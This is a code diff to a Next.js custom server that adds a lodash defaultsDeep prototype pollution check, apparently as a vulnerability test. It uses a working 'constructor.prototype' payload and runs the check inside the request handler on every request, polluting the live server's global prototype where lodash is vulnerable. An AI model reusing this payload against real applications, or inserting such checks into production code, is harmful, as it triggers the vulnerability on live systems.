@@ -1,6 +1,9 @@
 import { createServer } from 'http';
 import { parse } from 'url';
 import next from 'next';
+
+import defaultsDeep from "lodash/defaultsDeep.js"; 
+
 const dev = process.env.NODE_ENV !== 'production';
 const hostname = 'localhost';
 const port = Number(process.env.PORT) || 3000;
@@ -9,6 +12,20 @@ const app = next({ dev, hostname, port });
 const handle = app.getRequestHandler();
 // cannot import from next.config.mjs because this will break env load
 const CACHE_CONTROL_HEADER = 'x-cache-control';
+
+// check CVE
+const mergeFn = defaultsDeep;
+const payload = '{"constructor": {"prototype": {"a0": true}}}';
+
+function checkPrototypePollution() {
+  mergeFn({}, JSON.parse(payload));
+  if (({})["a0"] === true) {
+    console.log(`Vulnerable to Prototype Pollution via ${payload}`);
+  } else {
+    console.log("Not polluted (maybe lodash version patched?)");
+  }
+}
+//
 
 // allows us to override cache-control header
 const overrideSetHeader = (res) => {
@@ -36,6 +53,10 @@ app.prepare().then(() => {
     // This tells it to parse the query portion of the URL.
     const parsedUrl = parse(req.url, true);
 
+    // check CVE
+    checkPrototypePollution();
+    //
+    
     overrideSetHeader(res);
 
     await handle(req, res, parsedUrl);
